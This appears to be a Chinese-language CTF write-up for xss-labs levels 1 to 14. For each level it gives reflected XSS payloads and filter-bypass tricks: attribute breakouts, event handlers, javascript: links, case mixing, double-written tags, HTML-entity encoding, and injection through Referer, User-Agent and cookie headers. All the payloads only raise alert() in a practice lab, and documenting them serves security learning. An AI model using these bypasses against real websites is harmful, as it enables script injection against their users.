---
title: XSS 注入（xss-labs）
date: 2025-04-18 10:00:00
author: Xendr1a
categories: [CTF题解, xss-labs]
tags: [XSS, Writeup]
description: XSS 注入（xss-labs），包含题目思路、payload 与踩坑记录。
toc: true
---

## XSS注入（xxs-labs

1

```text
<script>alert('1');</script>
```

2

```text
查看F12发现需要闭合">
"><script>alert('1');</script>
```

3

```text
<>被转义了 ：onfocus可以绕过html实体化（即<>号的过滤)
' onfocus=alert('1')//
```

4

```text
观察一下发现了",把'改为"就欧克了
" onfocus=alert('1')//
```

5

```text
应该是" onfocus被过滤了因为不见了
那我们又得换方法了了
"> <a href=javascript:alert()>xxx</a> <"
"><a href="javascript:alert('abc')">//
弄一个超链接href进去，然后点蓝色的就行了
```

```text
href是Hypertext Reference的缩写。意思是指定超链接目标的URL。href 属性的值可以是任何有效文档的相对或绝对URL，包括片段标识符和JavaScript代码段
href属性的意思是 当标签<a>被点击的时候，就会触发执行转跳，上面是转跳到一个网站，我们还可以触发执行一段js代码
```

6

```text
ban了script我们可以使用大小写绕过
"><ScRipT>alert('XSS')</ScRiPt>
```

7

```text
大小写绕过也不管用了，在一次错误的拼写发现是替换掉script那么我们可以使用双写绕过
"><scrscriptipt>alert(1)</scrscriptipt>//
```

8

```text
1.因为给的是超链接我们直接输入
javascript:alert(1)
我们按F12看看是哪里过滤了，发现变成了javascr_ipt:alert(1)
把它改回来点进去就行了
2.利用Unicode编码，因为href属性会自动解析Unicode编码
javascript:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
```

9

```text
要解析到http://他才算个连接，我们直接加后面注释掉
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;/* http:// */
插入指定内容（本关是http://）绕过检测，再将指定内容用注释符注释掉即可
或者
javasc&#x72;ipt:%0dhttp://www.0aa.me%0dalert('ok')
&#x72; 是字符 r 的十六进制 HTML 实体编码，解码后为 r
然后用%0d换行绕过，分割语句
```

10

```text
查看F12发现三个隐藏的t_link t_history t_sort
看大佬的wp是直接这样写入
t_sort=" type="text" onclick="alert('abc')"
根据源码猜解传参的参数名，隐藏的input标签可以插入type="text"显示 
但是为啥只有第三个可以呢
```

11

```text
<input>标签有四个值，都做了隐藏处理，不难看出，第四个名为t_ref的<input>标签是http头referer的参数
是referer控制的第四个
直接改Referer:" type="text" onclick="alert('a')
```

12

```text
这个在U-a头
" type="text" onclick="alert('a')
```

13

```text
这个是cookie，抓包改user=" type="text" onclick="alert('abc')
                  user=" onclick=alert() type="text 
```

14

```text
文件问题做不了，但可以看看佬们的思路
是exif xss漏洞
可以在图片的属性里面添加XSS代码，然后上传图片实现弹窗。
```
